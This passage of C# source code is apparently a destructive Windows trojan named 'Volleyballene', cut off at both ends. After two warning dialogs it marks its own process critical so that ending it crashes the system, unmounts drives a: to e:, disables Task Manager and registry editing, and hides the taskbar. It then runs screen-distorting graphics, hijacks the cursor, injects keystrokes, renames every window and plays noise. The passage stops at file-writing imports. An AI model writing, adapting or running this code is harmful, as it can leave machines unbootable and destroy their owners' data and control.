            if (ext >= screenW / 5) { ext = 0; RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); }
        }
    }

    [DllImport("user32.dll", SetLastError = true)]
    internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
    public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);
    const short SWP_NOMOVE = 0X2;
    const short SWP_NOSIZE = 1;
    const short SWP_NOZORDER = 0X4;
    const int SWP_SHOWWINDOW = 0x0040;
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    [StructLayout(LayoutKind.Sequential)]
    public struct RECT
    {
        public int Left;        // x position of upper-left corner  
        public int Top;         // y position of upper-left corner  
        public int Right;       // x position of lower-right corner  
        public int Bottom;      // y position of lower-right corner  
    }
    [DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();

    public static Random r = new Random();
    private class cur : Payloads
    {
        private int redrawCounter;
        private int codcod;
        private int ballWidth = 1;
        private int ballHeight = 1;
        private int ballPosX = Cursor.Position.X;
        private int ballPosY = Cursor.Position.Y;
        private int moveStepX = 1;
        private int moveStepY = 1;
        public override void Draw(IntPtr hdc)
        {

            Random r = new Random();
            int x = screenW;
            int y = screenH;
            Cursor.Position = new Point(ballPosX, ballPosY);
            ballPosX += moveStepX;
            if (
                ballPosX < 0 ||
                ballPosX + ballWidth > screenW
                )
            {
                moveStepX = -moveStepX;
            }

            ballPosY += moveStepY;
            if (
                ballPosY < 0 ||
                ballPosY + ballHeight > screenH
                )
            {
                moveStepY = -moveStepY;
            }
            if (redrawCounter >= 360) { redrawCounter = 0; }
            if (codcod >= 360) { codcod = 0; }
        }
    }
    [DllImport("user32.dll")]
    static extern bool SetWindowText(IntPtr hWnd, string text);
    private class Windowtext : Payloads
    {
        private int redrawCounter;
        //hi if you use a decompiler: hi
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Process myProcess = new Process();
                Process[] processes = Process.GetProcesses();

                foreach (var process in processes)
                {

                    Console.WriteLine("Process Name: {0} ", process.ProcessName);

                    IntPtr handle = process.MainWindowHandle;
                    if (handle != IntPtr.Zero)
                    {
                        Random r = new Random();
                        SetWindowText(process.MainWindowHandle, "Terrible idea.");
                        Thread.Sleep(100);
                        //
                    }
                }
            }
            catch { }

        }
    }

    private class Type : Payloads
    {
        private int redrawCounter;
        //hi if you use a decompiler: hi
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Random r = new Random();
                var chars = "very bad boi ";
                var stringChars = new char[1];
                var random = new Random();

                for (int i = 0; i < stringChars.Length; i++)
                {
                    stringChars[i] = chars[random.Next(chars.Length)];
                }
                var finalString = new String(stringChars);

                SendKeys.SendWait(finalString);
                Thread.Sleep(r.Next(10, 10000));
            }
            catch { }
        }
    }

    private abstract class Payloads
    {
        public bool running;
        public Random random = new Random();
        public int screenW = Screen.PrimaryScreen.Bounds.Width;
        public int screenH = Screen.PrimaryScreen.Bounds.Height;

        public void Start()
        {
            if (!running)
            {
                running = true;
                new Thread(DrawLoop).Start();
            }
        }

        public void Stop()
        {
            running = false;
        }

        private void DrawLoop()
        {
            while (running)
            {
                IntPtr dC = GetDC(IntPtr.Zero);
                Draw(dC);
                ReleaseDC(IntPtr.Zero, dC);
            }
        }

        public void Redraw()
        {
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
        }

        public abstract void Draw(IntPtr hdc);
    }

    [Flags]
    private enum RedrawWindowFlags : uint
    {
        Invalidate = 1u,
        InternalPaint = 2u,
        Erase = 4u,
        Validate = 8u,
        NoInternalPaint = 0x10u,
        NoErase = 0x20u,
        NoChildren = 0x40u,
        AllChildren = 0x80u,
        UpdateNow = 0x100u,
        EraseNow = 0x200u,
        Frame = 0x400u,
        NoFrame = 0x800u
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern bool ShowWindow(int hWnd, int cmdShow);


    private const int SW_HIDE = 0x0000;
    private const int SW_SHOW = 0x0001;
    public static bool IsAdministrator()
    {
        var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    private static void by1(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    (t >> 6 | t | t >> (t >> 16)) * 10 + ((t >> 11) & 7)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by2(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    (((t >> ((t >> 12) % 4)) + t * (1 + (1 + (t >> 16) % 6) * ((t >> 10)) * (t >> 11) % 8)) ^ (t >> 13)) ^ ((t >> 6))
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by3(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * (((t >> 9) ^ ((t >> 9) - 1) ^ 1) % 13)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by4(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    9 * t & t >> 4 | 5 * t & t >> 7 | 3 * t & t >> 10
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by5(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t ^ t % 1001 + t ^ t % 1002
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by6(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * (3 + (1 ^ 5 & t >> 10)) * (5 + (3 & t >> 14)) >> (3 & t >> 8)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by7(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    20 * t * t * (t >> 11) / 7
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by8(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * (t ^ t + (t >> 15 | 1) ^ (t - 1280 ^ t) >> 10) * t
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by9(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    2 * (t >> 5 & t) - (t >> 5) + t * (t >> 14 & 14)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by10(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 44100;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t + (t & t >> 12) * t >> 8
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    private static void by11(int secs)
    {
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = 8000;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    (t * t >> 1 * (t >> 8)) | (t * t >> (t >> 6)) & (t * t >> 7)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }


    public static int isCritical = 1;  // we want this to be a Critical Process
    public static int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
    [STAThread]
    public static void Main()
    {
        Payloads bb1 = new bb1();
        Payloads bb2 = new bb2();
        Payloads bb3 = new bb3();
        Payloads bb4 = new bb4();
        Payloads bb5 = new bb5();
        Payloads bb6 = new bb6();
        Payloads payload = new payload1();
        Payloads payload2 = new payload2();
        Payloads payload3 = new payload3();
        Payloads payload4 = new payload4();
        Payloads payload5 = new payload5();
        Payloads payload6 = new payload6();
        Payloads payload7 = new payload7();
        Payloads payload8 = new payload8();
        Payloads payload9 = new payload9();
        Payloads payload10 = new payload10();
        Payloads payload11 = new payload11();
        Payloads payload12 = new payload12();
        Payloads payload13 = new payload13();
        Payloads payload14 = new payload14();
        Payloads payload15 = new payload15();
        Payloads payload16 = new payload16();
        Payloads type = new Type();
        Payloads cur = new cur();
        Payloads windowtext = new Windowtext();
        if (MessageBox.Show("You have ran a malware called Volleyballene\r\n" +
        "This malware has full control to delete your OS!\n" +
        "By clicking 'Yes' you conform that you want to run this malware!\n" +
        "If you don't know what this is, click 'No' to exit.\n" +
        "After using this malware, Windows will be unbootable!\n" +
        "Are you sure you want to run?", "Malware alert - Volleyballene", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        {
            if (MessageBox.Show("!!FINAL WARNING!!\r\n" +
            "This trojan has alot of destructive potentile.\n" +
            "You can lose all your data by continuing.\n" +
            "And the creator is not responasble for any damages made by this virus.\n" +
            "This was not made for public use, only for education puporses.\r\n" +
            "Are you sure?\r\n" +
            "This is the final warning to stop this program from exeucuting.", "Malware alert - Volleyballene", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
            {
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                system("/C mountvol a: /d");
                system("/C mountvol b: /d");
                system("/C mountvol c: /d");
                system("/C mountvol d: /d");
                system("/C mountvol e: /d");
                RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                int hwnd = FindWindow("Shell_TrayWnd", "");
                ShowWindow(hwnd, SW_HIDE);
                Thread.Sleep(500);
                type.Start();
                cur.Start();
                windowtext.Start();
                payload.Start();
                payload2.Start();
                by1(30);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                payload.Stop();
                payload2.Stop();
                payload3.Start();
                bb4.Start();
                payload3.Stop();
                bb4.Stop();
                payload4.Start();
                by4(30);
                payload4.Stop();
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                payload5.Start();
                payload6.Start();
                payload.Start();
                Thread.Sleep(250);
                by6(30);
                payload.Stop();
                payload5.Stop();
                payload6.Stop();
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                by5(30);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                payload6.Stop();
                payload7.Stop();
                payload8.Start();
                by8(30);
                payload8.Stop();
                payload.Start();
                payload2.Start();
                payload10.Start();
                payload6.Start();
                payload7.Start();
                payload9.Start();
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                by10(30);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                payload.Stop();
                payload2.Stop();
                payload10.Stop();
                payload6.Stop();
                payload7.Stop();
                payload8.Stop();
                payload9.Start();
                payload12.Start();
                payload13.Start();
                by2(30);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                payload9.Stop();
                payload11.Stop();
                payload12.Start();
                payload3.Start();
                by9(30);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                payload12.Stop();
                payload3.Stop();
                payload13.Start();
                by8(30);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                payload13.Stop();
                payload14.Start();
                payload5.Start();
                by3(30);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                payload6.Start();
                payload15.Start();
                by9(30);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                payload14.Stop();
                payload5.Stop();
                payload.Start();
                payload2.Start();
                payload3.Start();
                payload4.Start();
                payload6.Start();
                payload7.Start();
                payload8.Start();
                payload9.Start();
                payload10.Start();
                payload11.Start();
                payload12.Start();
                payload13.Start();
                payload14.Start();
                payload15.Start();
                payload16.Start();
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                by5(30);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                payload.Stop();
                payload2.Stop();
                payload3.Stop();
                payload4.Stop();
                payload6.Stop();
                payload7.Stop();
                payload8.Stop();
                payload9.Stop();
                payload10.Stop();
                payload11.Stop();
                payload12.Stop();
                payload13.Stop();
                payload14.Stop();
                payload15.Stop();
                payload16.Stop();
                Environment.Exit(0);
            }
        }
    }


    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(uint crColor);

    [DllImport("gdi32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DeleteObject([In] IntPtr hObject);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

    [DllImport("gdi32.dll")]
    private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

    [DllImport("user32.dll")]
    private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);

    [DllImport("gdi32.dll")]
    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
TernaryRasterOperations dwRop);
    public enum TernaryRasterOperations
    {
        SRCCOPY = 0x00CC0020, // dest = source
        SRCPAINT = 0x00EE0086, // dest = source OR dest
        SRCAND = 0x008800C6, // dest = source AND dest
        SRCINVERT = 0x00660046, // dest = source XOR dest
        SRCERASE = 0x00440328, // dest = source AND (NOT dest)
        NOTSRCCOPY = 0x00330008, // dest = (NOT source)
        NOTSRCERASE = 0x001100A6, // dest = (NOT src) AND (NOT dest)
        MERGECOPY = 0x00C000CA, // dest = (source AND pattern)
        MERGEPAINT = 0x00BB0226, // dest = (NOT source) OR dest
        PATCOPY = 0x00F00021, // dest = pattern
        PATPAINT = 0x00FB0A09, // dest = DPSnoo
        PATINVERT = 0x005A0049, // dest = pattern XOR dest
        DSTINVERT = 0x00550009, // dest = (NOT dest)
        BLACKNESS = 0x00000042, // dest = BLACK
        WHITENESS = 0x00FF0062, // dest = WHITE
        hmm = 0x00100C85
    };

    [DllImport("msvcrt.dll")]
    public static extern int system(string format);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(
string lpFileName,
uint dwDesiredAccess,
uint dwShareMode,
IntPtr lpSecurityAttributes,
uint dwCreationDisposition,
uint dwFlagsAndAttributes,
IntPtr hTemplateFile);
    [DllImport("kernel32")]
    private static extern bool WriteFile(
IntPtr hFile,
byte[] lpBuffer,
uint nNumberOfBytesToWrite,
